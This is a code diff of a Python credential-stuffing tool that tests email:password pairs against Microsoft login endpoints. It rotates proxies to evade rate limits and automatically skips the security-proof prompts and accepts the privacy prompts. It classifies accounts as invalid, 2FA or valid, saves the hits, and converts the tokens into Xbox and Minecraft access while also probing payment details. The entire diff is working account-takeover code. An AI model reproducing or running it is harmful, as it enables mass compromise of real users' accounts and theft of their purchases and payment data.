-    session = requests.Session()
-    session.verify = False
-    
-    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'DNT': '1', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'})
-    
-    pool_size = max(1, int(config.get('connection_pool_size', 10)))
-    
-    use_proxies = config.get('use_proxies', False)
-    backoff = 0.5
-    retry_strategy = Retry(total=0, connect=0, read=0)
-    adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size, max_retries=retry_strategy)
-    session.mount('https://', adapter)
-    session.mount('http://', adapter)
-    return session
+    return get_thread_session()
 
 _LOGIN_CONFIGS = [
     dict(
@@ -2961,11 +3435,10 @@ def _record_toomany(idx: int):
             _cfg_reset_at[idx] = now
         _cfg_toomany[idx] += 1
 
-import urllib.parse
-import uuid
 
 def _get_outlook_tokens(email, session):
-    for _ in range(4):
+    
+    for _ in range(2):
         try:
             headers = {
                 "Connection": "keep-alive",
@@ -2981,7 +3454,6 @@ def _get_outlook_tokens(email, session):
                 "x-client-src-sku": "MSAL.xplat.android",
                 "X-Requested-With": "com.microsoft.outlooklite",
             }
-
             params = {
                 "client_info": "1",
                 "haschrome": "1",
@@ -2992,16 +3464,12 @@ def _get_outlook_tokens(email, session):
                 "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                 "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
             }
-
             url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
-            res = session.get(url, headers=headers, timeout=12)
+            res = session.get(url, headers=headers, timeout=5)
             text = res.text
-
             if '"urlPost":"' not in text:
                 continue
-
             urlPost = text.split('"urlPost":"')[1].split('",')[0]
-
             PPFT = None
             for ppft_start, ppft_end in [
                 ('name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"'),
@@ -3019,7 +3487,6 @@ def _get_outlook_tokens(email, session):
                         continue
             if not PPFT:
                 continue
-
             cok = res.cookies.get_dict()
             return (
                 urlPost, PPFT,
@@ -3028,327 +3495,464 @@ def _get_outlook_tokens(email, session):
                 cok.get('RefreshTokenSso', ''), cok.get('MSPOK', ''),
                 cok.get('OParams', '')
             )
-        except Exception as e:
+        except Exception:
             continue
     return None
 
-def _ms_login(email, password, session, proxy):
-    """Primary login via bypass.txt Outlook-lite fresh PPFT approach."""
-
-    tokens = _get_outlook_tokens(email, session)
-    if tokens:
-        host, h1, h2, h3, h4, h6, h7, h8 = tokens
-        payload = {
-            "i13": "1", "login": email, "loginfmt": email, "type": "11",
-            "LoginOptions": "1", "lrt": "", "lrtPartition": "", "hisRegion": "",
-            "hisScaleUnit": "", "passwd": password, "ps": "2",
-            "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
-            "canary": "", "ctx": "", "hpgrequestid": "", "PPFT": h1,
-            "PPSX": "PassportR", "NewUser": "1", "FoundMSAs": "",
-            "fspost": "0", "i21": "0", "CookieDisclosure": "0",
-            "IsFidoSupported": "0", "isSignupPost": "0",
-            "isRecoveryAttemptPost": "0", "i19": "9960"
-        }
-        login_headers = {
-            "Host": "login.live.com",
-            "Connection": "keep-alive",
-            "Content-Length": str(len(urllib.parse.urlencode(payload))),
-            "Cache-Control": "max-age=0",
-            "Upgrade-Insecure-Requests": "1",
-            "Origin": "https://login.live.com",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-User": "?1",
-            "Sec-Fetch-Dest": "document",
-            "Referer": f"{h2}haschrome=1" if h2 else "https://login.live.com/",
-            "Accept-Encoding": "gzip, deflate",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Cookie": f"MSPRequ={h3};uaid={h4};RefreshTokenSso={h6};MSPOK={h7};OParams={h8}"
-        }
+def _get_fresh_ppft_spykii(email, session):
+    
+    client_ids = ['0000000048170EF2', '00000000402B5328']
+    for cid in client_ids:
         try:
-            r = session.post(host, data=payload, headers=login_headers, allow_redirects=True, timeout=12)
-            body_lower = r.text.lower()
+            r = session.get(
+                'https://login.live.com/oauth20_authorize.srf',
+                params={
+                    'client_id': cid,
+                    'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
+                    'response_type': 'token',
+                    'scope': 'offline_access openid profile service::outlook.office.com::MBI_SSL' if cid == '0000000048170EF2' else 'service::user.auth.xboxlive.com::MBI_SSL',
+                    'display': 'touch',
+                    'login_hint': email,
+                    'msproxy': '1',
+                },
+                headers={
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0',
+                    'client-request-id': str(uuid.uuid4()),
+                    'Accept': 'text/html,*/*',
+                },
+                timeout=7,
+            )
+            text = r.text
+            
+
+            url_post = None
+            for marker in ('"urlPost":"', "'urlPost':'"):
+                if marker in text:
+                    rest = text.split(marker, 1)[1]
+                    end_char = '"' if marker == '"urlPost":"' else "'"
+                    url_post = rest.split(end_char, 1)[0].replace('\\u0026', '&').replace(r'\u0026', '&').replace('&amp;', '&')
+                    break
+            if not url_post:
+                m_url = re.search(r'urlPost["\']?\s*:\s*["\']([^"\'\\]+)', text) or re.search(r'action=\\*["\']([^"\'\\]+)', text)
+                if m_url:
+                    url_post = m_url.group(1).replace('\\u0026', '&').replace(r'\u0026', '&').replace('&amp;', '&')
+            if not url_post:
+                continue
 
 
-            if any(k in body_lower for k in [
-                "password is incorrect", "that microsoft account doesn't exist",
-                "account doesn't exist", "no account found",
-                "invalid username or password", "we couldn't find an account",
-            ]):
-                return "None"
-
-
-            if any(k in body_lower for k in [
-                "two-step", "two factor", "verification code",
-                "authenticator", "sign-in was blocked", "account is locked",
-                "enter a code", "verify your identity",
-            ]):
-                return "2FA"
-
-
-            if "account.live.com/proofs" in r.text or "account.live.com/proofs" in r.url:
-                try:
-                    ipt   = r.text.split('id="ipt" value="')[1].split('"')[0]
-                    pprid = r.text.split('id="pprid" value="')[1].split('"')[0]
-                    uaid  = r.text.split('id="uaid" value="')[1].split('"')[0]
-                    fmhf  = r.text.split('id="fmHF" action="')[1].split('"')[0]
-                    r2 = session.post(
-                        fmhf,
-                        data=f"ipt={ipt}&pprid={pprid}&uaid={uaid}",
-                        headers={"Content-Type": "application/x-www-form-urlencoded"},
-                        timeout=15, allow_redirects=True,
-                    )
-                    try:
-                        canary = r2.text.split('id="canary" name="canary" value="')[1].split('"')[0] if 'id="canary"' in r2.text else ""
-                        action = r2.text.split('id="frmAddProof" method="post" action="')[1].split('"')[0]
-                        session.post(
-                            action,
-                            data={"iProofOptions": "Email", "DisplayPhoneCountryISO": "US",
-                                  "DisplayPhoneNumber": "", "EmailAddress": "",
-                                  "canary": canary, "action": "Skip",
-                                  "PhoneNumber": "", "PhoneCountryISO": ""},
-                            headers={"Content-Type": "application/x-www-form-urlencoded"},
-                            timeout=15, allow_redirects=True,
-                        )
-                    except Exception:
-                        pass
-                except Exception:
-                    pass
-
-
-
-            if "privacynotice.account.microsoft.com" in r.text or "privacynotice.account.microsoft.com" in r.url:
-                try:
-                    priv_url = r.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
-                    corr_id  = r.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
-                    code_v   = r.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
-                    client   = r.text.split('type="hidden" name="client_info" id="client_info" value="')[1].split('"')[0]
-                    session.post(
-                        priv_url,
-                        data={"correlation_id": corr_id, "code": code_v,
-                              "client_info": client, "action": "accept"},
-                        headers={"Content-Type": "application/x-www-form-urlencoded"},
-                        timeout=15, allow_redirects=True,
-                    )
-                except Exception:
-                    pass
-
-
-            rps_result = get_urlPost_sFTTag(session)
-            if rps_result and rps_result[0] != "ERROR" and rps_result[1]:
-                rps_url, rps_sft, auth_session = rps_result
-                rps_token_result = get_xbox_rps(auth_session, email, password, rps_url, rps_sft)
-                if rps_token_result:
-                    rps_tok, _ = rps_token_result
-                    if rps_tok and rps_tok not in ("None", "2FA", "ERROR"):
-                        return rps_tok
-                    elif rps_tok == "2FA":
-                        return "2FA"
-                    elif rps_tok == "None":
-                        return "None"
-
-
-            try:
-                r2 = session.get(
-                    "https://login.live.com/oauth20_authorize.srf"
-                    "?client_id=00000000402B5328&response_type=token"
-                    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
-                    "&redirect_uri=https://login.live.com/oauth20_desktop.srf",
-                    allow_redirects=True, timeout=12
+            ppft = None
+            for marker in ('name="PPFT"', 'name=\\"PPFT\\"', '"sFT":"', "'sFT':'", 'sFTTag:'):
+                if 'name="PPFT"' in text:
+                    m = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text) or re.search(r'value="([^"]+)"[^>]*name="PPFT"', text)
+                    if m: ppft = m.group(1); break
+                if 'name=\\"PPFT\\"' in text:
+                    m = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^"]+)\\"', text)
+                    if m: ppft = m.group(1); break
+                if '"sFT":"' in text:
+                    ppft = text.split('"sFT":"', 1)[1].split('"', 1)[0]
+                    break
+            if not ppft:
+                m_ppft = (
+                    re.search(r'name=\\*["\']PPFT\\*["\'][^>]*value=\\*["\']([^"\'\\]+)', text) or
+                    re.search(r'value=\\*["\']([^"\'\\]+)\\*["\'][^>]*name=\\*["\']PPFT', text) or
+                    re.search(r'PPFT["\']?\s*:\s*["\']([^"\'\\]+)', text) or
+                    re.search(r'sFTTag["\']?\s*:\s*["\'].*?value=\\*["\']([^"\'\\]+)', text) or
+                    re.search(r'sFT["\']?\s*:\s*["\']([^"\'\\]+)', text)
                 )
-                frag = urllib.parse.urlparse(r2.url).fragment
-                tok = urllib.parse.parse_qs(frag).get("access_token", [None])[0]
-                if tok and tok != "None":
-                    return tok
+                if m_ppft:
+                    ppft = m_ppft.group(1)
+            if not ppft:
+                continue
 
+            ck = r.cookies.get_dict()
+            parts = [f'{k}={ck[k]}' for k in ('MSPRequ', 'uaid', 'MSPOK', 'OParams', 'MSFPC', 'MUID') if ck.get(k)]
+            if not parts:
+                parts.append(f'MSPOK=$uuid-{uuid.uuid4()}')
+            return url_post, ppft, '; '.join(parts)
+        except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout):
+            return None
+        except Exception:
+            continue
+    return None
+
+
+def _spykii_attempt(session, email, password, url, ppft, cookie):
+    
+    _UA_MOB = 'Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0'
+    c429 = 0
+    while True:
+        try:
+            r = session.post(
+                url,
+                data={
+                    'ps': '2', 'psRNGCDefaultType': '1',
+                    'psRNGCEntropy': '', 'psRNGCSLK': ppft,
+                    'canary': '', 'ctx': '', 'hpgrequestid': '',
+                    'PPFT': ppft, 'PPSX': 'Pas', 'NewUser': '1',
+                    'FoundMSAs': '', 'fspost': '0', 'i21': '0',
+                    'CookieDisclosure': '0', 'IsFidoSupported': '1',
+                    'isSignupPost': '0', 'isRecoveryAttemptPost': '0',
+                    'i13': '1', 'login': email, 'loginfmt': email,
+                    'type': '11', 'LoginOptions': '1', 'lrt': '',
+                    'lrtPartition': '', 'hisRegion': '',
+                    'hisScaleUnit': '', 'passwd': password,
+                },
+                headers={
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Cookie': cookie, 'User-Agent': _UA_MOB,
+                    'Referer': 'https://login.live.com/',
+                    'Origin': 'https://login.live.com',
+                    'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Upgrade-Insecure-Requests': '1',
+                },
+                timeout=12, allow_redirects=False,
+            )
+        except Exception:
+            return 'ERROR'
+
+        code = r.status_code
+        if code == 429:
+            c429 += 1
+            if c429 >= 4:
+                return 'ERROR'
+            time.sleep(min(3 * c429, 10))
+            continue
+        if code >= 500:
+            return 'ERROR'
+
+
+        loc = r.headers.get('Location', '')
+        if 'access_token=' in loc:
+            try:
+                tok = urllib.parse.unquote(loc.split('access_token=')[1].split('&')[0])
+                if tok and tok.lower() != 'none':
+                    return session, tok
             except Exception:
                 pass
+        if 'srf?code=' in loc or 'oauth20_desktop.srf?' in loc:
+            return session, None
 
+        raw = r.text
+        body = raw.lower()
+
+
+        rate_limited_kws = (
+            'too many times', "you've tried to sign in", "you have tried to sign in",
+            'tried to sign in too many', 'too many incorrect', 'temporarily blocked',
+            'try again later', 'unusual volume', 'service is temporarily unavailable',
+            ',ac:null,'
+        )
+        if any(k in body for k in rate_limited_kws):
+            return 'ERROR'
+
+
+        bad_kws = (
+            'your account or password is incorrect', 'password is incorrect',
+            "that microsoft account doesn't exist", "account doesn't exist",
+            "we couldn't find an account", 'incorrect username or password',
+        )
+        if any(k in body for k in bad_kws):
+            return 'None'
+
+
+        if 'name="fmHF"' in raw or 'id="fmHF"' in raw or 'cancel?mkt=' in raw or 'id="ipt"' in raw or 'name="ipt"' in raw:
+            try:
+                ipt_m = re.search(r'name="ipt"\s+value="([^"]+)"', raw) or re.search(r'id="ipt"\s+value="([^"]+)"', raw) or re.search(r'(?<="ipt" value=").+?(?=">)', raw)
+                pprid_m = re.search(r'name="pprid"\s+value="([^"]+)"', raw) or re.search(r'id="pprid"\s+value="([^"]+)"', raw) or re.search(r'(?<="pprid" value=").+?(?=">)', raw)
+                uaid_m = re.search(r'name="uaid"\s+value="([^"]+)"', raw) or re.search(r'id="uaid"\s+value="([^"]+)"', raw) or re.search(r'(?<="uaid" value=").+?(?=">)', raw)
+                action_m = re.search(r'action="([^"]+)"', raw) or re.search(r'(?<=id="fmHF" action=").+?(?=" )', raw)
+                if ipt_m and pprid_m and uaid_m and action_m:
+                    ipt_v = ipt_m.group(1) if hasattr(ipt_m, 'group') and len(ipt_m.groups()) > 0 else ipt_m.group()
+                    pprid_v = pprid_m.group(1) if hasattr(pprid_m, 'group') and len(pprid_m.groups()) > 0 else pprid_m.group()
+                    uaid_v = uaid_m.group(1) if hasattr(uaid_m, 'group') and len(uaid_m.groups()) > 0 else uaid_m.group()
+                    act_v = action_m.group(1) if hasattr(action_m, 'group') and len(action_m.groups()) > 0 else action_m.group()
+                    act_v = act_v.replace('&amp;', '&')
+                    r_cancel = session.post(act_v, data={'ipt': ipt_v, 'pprid': pprid_v, 'uaid': uaid_v}, headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': _UA_MOB}, timeout=8, allow_redirects=True)
+                    if 'access_token=' in getattr(r_cancel, 'url', ''):
+                        tok = parse_qs(urlparse(r_cancel.url).fragment).get('access_token', [None])[0]
+                        if tok and tok != 'None':
+                            return session, tok
+                    ret_url_m = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', r_cancel.text) or re.search(r'"returnUrl":"([^"]+)"', r_cancel.text)
+                    if ret_url_m:
+                        ret_url = ret_url_m.group(1) if hasattr(ret_url_m, 'group') and len(ret_url_m.groups()) > 0 else ret_url_m.group()
+                        ret_url = ret_url.replace('\\/', '/')
+                        r_fin = session.get(ret_url, allow_redirects=True, timeout=8)
+                        if 'access_token=' in getattr(r_fin, 'url', ''):
+                            tok = parse_qs(urlparse(r_fin.url).fragment).get('access_token', [None])[0]
+                            if tok and tok != 'None':
+                                return session, tok
+                    return session, None
+            except Exception:
+                pass
+            return session, None
+
+
+        if 'privacynotice.account.microsoft.com' in raw or 'privacy.microsoft.com' in body:
+            try:
+                priv = raw.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
+                corr = raw.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
+                cod  = raw.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
+                cli  = raw.split('type="hidden" name="client_info" id="client_info" value="')[1].split('"')[0]
+                session.post(priv, data={'correlation_id': corr, 'code': cod, 'client_info': cli, 'action': 'accept'}, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=8, allow_redirects=True)
+            except Exception:
+                pass
+            return session, None
+
+
+        tfa_kws = (
+            'two-step verification', 'two-step', 'two factor',
+            'verify your identity', 'verification code', 'enter the code',
+            'authenticator app', 'microsoft authenticator', 'approve the request',
+            'sign-in was blocked', 'account is locked', 'account has been locked',
+            'unusual activity', 'suspicious activity', 'confirm your identity',
+            'help us protect your account', 'keep your account secure'
+        )
+        tfa_raw = ('identity/confirm', 'Email/Confirm', '/abuse?mkt=', '/Abuse?mkt=')
+        if any(k in body for k in tfa_kws) or any(k in raw for k in tfa_raw):
+            return '2FA'
+
+
+        success_kws = ('account.microsoft.com', 'signout?', 'Sign out', '/SignOut', 'profile.live.com', 'sSigninName', 'msaDisplayName')
+        if any(k in raw for k in success_kws):
+            return session, None
+
+
+        try:
+            ck = {c.name: c.value for c in session.cookies}
         except Exception:
-            pass
+            ck = {}
+        if ck.get('WLSSC'):
+            return session, None
+
+        return 'ERROR'
 
 
-    try:
-        rps_result = get_urlPost_sFTTag(session)
-        if rps_result and rps_result[0] != "ERROR" and rps_result[1]:
-            rps_url, rps_sft, auth_session = rps_result
-            rps_token_result = get_xbox_rps(auth_session, email, password, rps_url, rps_sft)
-            if rps_token_result:
-                rps_tok, _ = rps_token_result
-                if rps_tok and rps_tok not in ("None", "2FA", "ERROR"):
-                    return rps_tok
-                elif rps_tok == "2FA":
-                    return "2FA"
-                elif rps_tok == "None":
-                    return "None"
-    except Exception:
-        pass
+def _ms_login(email, password, session, proxy):
+
+
+    fresh = _get_fresh_ppft_spykii(email, session)
+    if fresh:
+        url_post, ppft, cookie = fresh
+        result = _spykii_attempt(session, email, password, url_post, ppft, cookie)
+        if result not in ('None', '2FA', 'ERROR') and result is not None:
+            return result  # (session, token|None)
+        if result == 'None':
+            return 'None'
+        if result == '2FA':
+            return '2FA'
+
+
+    fresh_outlook = _get_outlook_tokens(email, session)
+    if fresh_outlook:
+        url_post, ppft, cookie = fresh_outlook[0], fresh_outlook[1], fresh_outlook[2]
+        result = _spykii_attempt(session, email, password, url_post, ppft, cookie)
+        if result not in ('None', '2FA', 'ERROR') and result is not None:
+            return result  # (session, token|None)
+        if result == 'None':
+            return 'None'
+        if result == '2FA':
+            return '2FA'
 
 
     cfg_order = sorted(range(len(_LOGIN_CONFIGS)), key=lambda i: _cfg_toomany[i])
     for cfg_idx in cfg_order:
         cfg = _LOGIN_CONFIGS[cfg_idx]
-        toomany_hits = 0
-        attempts = 0
-        while attempts < 3:
-            attempts += 1
-            try:
-                r = session.post(
-                    cfg["url"].replace("%7bemail%7d", urllib.parse.quote(email)),
-                    data={
-                        "login": email,
-                        "loginfmt": email,
-                        "passwd": password,
-                        "PPFT": cfg["ppft"],
-                    },
-                    headers={
-                        "Content-Type": "application/x-www-form-urlencoded",
-                        "Cookie": cfg["cookie"],
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-                    },
-                    timeout=15,
-                    allow_redirects=False,
-                )
-            except Exception:
-                break
+        url = cfg['url'].replace('%7bemail%7d', urllib.parse.quote(email))
+        result = _spykii_attempt(session, email, password, url, cfg['ppft'], cfg['cookie'])
+        if result == 'None':
+            return 'None'
+        if result == '2FA':
+            return '2FA'
+        if result == 'ERROR':
+            _record_toomany(cfg_idx)
+            continue
+        if result is not None and result != 'ERROR':
+            return result  # (session, token|None)
 
-            code = r.status_code
-            if code == 429:
-                time.sleep(1.5)
-                continue
-            if code >= 500:
-                time.sleep(1)
-                continue
+    return 'ERROR'
 
-            loc = r.headers.get("Location", "")
-            if "access_token=" in loc:
-                try:
-                    token = urllib.parse.unquote(loc.split("access_token=")[1].split("&")[0])
-                    if token and token != "None":
-                        return token
-                except Exception:
-                    pass
-            elif "t=" in loc:
-                try:
-                    token = urllib.parse.unquote(loc.split("t=")[1].split("&")[0])
-                    if token and token != "None":
-                        return token
-                except Exception:
-                    pass
-
-            try:
-                body = r.text.lower()
-            except Exception:
-                body = ""
-
-            if "you have tried too many times" in body or "tried too many" in body or "too many incorrect password" in body:
-                _record_toomany(cfg_idx)
-                toomany_hits += 1
-                if toomany_hits >= 2:
-                    break
-                session.proxies = getproxy()
-                time.sleep(1.5)
-                continue
-
-            if any(k in body for k in [
-                "password is incorrect",
-                "that microsoft account doesn't exist",
-                "account doesn't exist",
-                "no account found",
-                "we couldn't find an account",
-                "invalid username or password",
-            ]):
-                return "None"
-
-            if any(k in body for k in [
-                "two-step", "two factor", "verification code",
-                "authenticator", "suggestedaction",
-                "sign-in was blocked", "account is locked",
-                "suspended", "unusual activity",
-            ]):
-                return "2FA"
-
-            break
-
-    return "ERROR"
-
-def authenticate(email, password, use_optimized=True):
+def authenticate(email, password, session=None, use_optimized=True):
     global retries, bad, checked, cpm, twofa
     current_try = 0
     while current_try <= maxretries:
+        session = None
+        proxy_raw = None
         try:
             session = create_optimized_session()
             session.cookies.clear()
             proxy_config = None
             if proxytype != "'4'":
                 try:
-                    proxy_config = getproxy()
+                    proxy_config, proxy_raw = getproxy(return_raw=True)
                     if proxy_config:
                         session.proxies = proxy_config
                 except Exception:
                     pass
-            
-            token = _ms_login(email, password, session, proxy_config)
-            
-            if token == 'ERROR':
+
+            result = _ms_login(email, password, session, proxy_config)
+
+
+            if result == 'ERROR':
+                if proxy_raw:
+                    mark_proxy_failed(proxy_raw)
                 current_try += 1
                 try: session.close()
                 except: pass
-                time.sleep(1)
                 continue
-            if token == '2FA':
+
+            if result == '2FA':
                 with stats_lock:
                     twofa += 1
+                try:
+                    write_dedupe(fname, '2fa.txt', f'{email}:{password}\n')
+                except Exception:
+                    pass
                 if UI_ENABLED and ui:
                     ui.log_2fa(email)
                 try: session.close()
                 except: pass
                 return '2FA'
-            elif token == 'None' or token is None:
-                if UI_ENABLED and ui:
-                    ui.log_bad(email)
+
+            if result == 'None' or result is None:
                 try: session.close()
                 except: pass
                 return False
-                
-            if token != 'None' and token != '2FA':
-                hit = False
-                try:
-                    xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': token}, 'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
-                    js = xbox_login.json()
-                    xbox_token = js.get('Token')
-                    if xbox_token is not None:
-                        uhs = js['DisplayClaims']['xui'][0]['uhs']
-                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
-                        js = xsts.json()
-                        xsts_token = js.get('Token')
-                        if xsts_token is not None:
-                            access_token = mc_token(session, uhs, xsts_token)
-                            if access_token is not None:
-                                hit = checkmc(session, email, password, access_token, xbox_token)
-                except Exception:
-                    pass
+
+
+            if isinstance(result, tuple):
+                login_session, access_token = result
+                if login_session is not None:
+                    session = login_session
+            else:
+                access_token = result  # legacy fallback
+
+
+            xbox_token_for_auth = None
+            try:
+                xbox_auth_url = (
+                    'https://login.live.com/oauth20_authorize.srf'
+                    '?client_id=00000000402B5328&response_type=token'
+                    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
+                    '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
+                )
+                r_silent = session.get(xbox_auth_url, timeout=10, allow_redirects=True)
+                import urllib.parse as _up
+                for resp in [r_silent] + list(getattr(r_silent, 'history', [])):
+                    if hasattr(resp, 'url') and resp.url:
+                        frag = _up.parse_qs(_up.urlparse(resp.url).fragment)
+                        if 'access_token' in frag and frag['access_token'][0]:
+                            xbox_token_for_auth = frag['access_token'][0]
+                            break
+                        qs = _up.parse_qs(_up.urlparse(resp.url).query)
+                        if 'access_token' in qs and qs['access_token'][0]:
+                            xbox_token_for_auth = qs['access_token'][0]
+                            break
+                    loc = resp.headers.get('Location', '') if hasattr(resp, 'headers') else ''
+                    if 'access_token=' in loc:
+                        xbox_token_for_auth = _up.unquote(loc.split('access_token=')[1].split('&')[0])
+                        break
+            except Exception:
+                pass
+
+
+            if not xbox_token_for_auth and access_token:
+                xbox_token_for_auth = access_token
+
+            if not xbox_token_for_auth:
+
                 if config.get('payment') is True:
                     try: payment(session, email, password)
                     except: pass
-                try: session.close()
+                validmail(email, password)
+
+                try:
+                    threading.Thread(target=enrich_valid_account, args=(session, email, password, None, fname), daemon=True).start()
+                except Exception:
+                    pass
+                return 'VALID_MAIL'
+
+
+            hit = False
+            xbl_token = None
+            _using_proxy = (proxytype != "'4'")
+            for _xbox_attempt in range(2):  # retry once on connection error
+                try:
+
+                    xbox_login = session.post(
+                        'https://user.auth.xboxlive.com/user/authenticate',
+                        json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com',
+                                             'RpsTicket': xbox_token_for_auth},
+                              'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'},
+                        headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+                        timeout=int(config.get('timeout', 10))
+                    )
+
+                    if xbox_login.status_code != 200:
+
+                        rps2 = 'd=' + xbox_token_for_auth if not xbox_token_for_auth.startswith('d=') else xbox_token_for_auth
+                        xbox_login = session.post(
+                            'https://user.auth.xboxlive.com/user/authenticate',
+                            json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com',
+                                                 'RpsTicket': rps2},
+                                  'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'},
+                            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+                            timeout=int(config.get('timeout', 10))
+                        )
+
+                    if xbox_login.status_code == 200:
+                        js = xbox_login.json()
+                        xbl_token = js.get('Token')
+                        if xbl_token:
+                            uhs = js['DisplayClaims']['xui'][0]['uhs']
+                            xsts = session.post(
+                                'https://xsts.auth.xboxlive.com/xsts/authorize',
+                                json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbl_token]},
+                                      'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'},
+                                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+                                timeout=int(config.get('timeout', 10))
+                            )
+                            if xsts.status_code == 200:
+                                xsts_token = xsts.json().get('Token')
+                                if xsts_token:
+                                    mc_access = mc_token(session, uhs, xsts_token)
+                                    if mc_access:
+                                        hit = checkmc(session, email, password, mc_access, xbl_token)
+                    break  # success or non-connection error , don't retry
+
+                except Exception:
+
+                    if _xbox_attempt == 0 and _using_proxy:
+                        try:
+                            session.proxies = getproxy()
+                        except Exception:
+                            pass
+                    else:
+                        break
+
+            if config.get('payment') is True:
+                try: payment(session, email, password)
                 except: pass
-                if not hit:
-                    if 'xbox_login' in locals() and xbox_login.status_code in [400, 401]:
-                        current_try += 1
-                        time.sleep(1)
-                        continue
-                    validmail(email, password)
-                    return 'VALID_MAIL'
-                else:
-                    return True
-        except Exception as e:
+
+            validmail(email, password)
+
+
+            try:
+                threading.Thread(target=enrich_valid_account, args=(session, email, password, xbl_token, fname), daemon=True).start()
+            except Exception:
+                pass
+
+            if hit:
+                return True
+            return 'VALID_MAIL'
+
+        except Exception:
+            if proxy_raw:
+                mark_proxy_failed(proxy_raw)
             current_try += 1
-            retries += 1
-            try: session.close()
-            except: pass
+            with stats_lock:
+                retries += 1
             if current_try > maxretries:
                 return 'ERROR'
     return 'ERROR'
@@ -3417,7 +4021,7 @@ def fetch_proxies_from_api(proxy_type='http'):
 
 failed_proxies = set()
 proxy_failure_count = {}
-PROXY_FAILURE_THRESHOLD = 3
+PROXY_FAILURE_THRESHOLD = 2
 proxy_blacklist_lock = threading.Lock()
 
 def mark_proxy_failed(proxy_str):
@@ -3433,7 +4037,7 @@ def mark_proxy_failed(proxy_str):
             failed_proxies.add(proxy_str)
 
 
-def getproxy():
+def getproxy(return_raw=False):
     global auto_proxy, last_proxy_fetch, proxy_time, proxylist, proxytype
     proxy_protocol = 'http'
     if proxytype == "'2'":
@@ -3441,24 +4045,24 @@ def getproxy():
     elif proxytype == "'3'":
         proxy_protocol = 'socks5'
     elif proxytype == "'4'":
-        return {}
+        return ({}, None) if return_raw else {}
     if auto_proxy and len(proxylist) == 0:
         fetch_proxies_from_api(proxy_protocol)
     elif auto_proxy and last_proxy_fetch > 0 and (time.time() - last_proxy_fetch >= proxy_time * 60):
         fetch_proxies_from_api(proxy_protocol)
     if len(proxylist) > 0:
-        available_proxies = [p for p in proxylist if p not in failed_proxies]
-        
-        if len(available_proxies) == 0 and len(proxylist) > 0:
-            failed_proxies.clear()
-            proxy_failure_count.clear()
-            available_proxies = proxylist
-        
-        if len(available_proxies) > 0:
-            proxy = random.choice(available_proxies)
-        else:
-            return {}
+        with proxy_blacklist_lock:
+            available_proxies = [p for p in proxylist if p not in failed_proxies]
             
